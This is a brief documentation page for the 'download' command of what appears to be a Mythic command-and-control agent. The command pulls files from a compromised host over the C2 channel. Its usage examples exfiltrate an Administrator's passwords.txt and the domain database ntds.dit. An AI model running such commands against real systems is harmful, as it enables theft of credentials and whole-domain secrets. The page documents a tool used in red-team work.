+++
title = "download"
chapter = false
weight = 5
+++

## Summary
Download a file from the target to Mythic. The file is chunked and transferred over the C2 channel.

## Arguments
| Name | Required | Description |
|------|----------|-------------|
| `path` | Yes | Path to the file on the target |

## Usage
```
download C:\Users\Administrator\Documents\passwords.txt
download C:\Windows\NTDS\ntds.dit
```
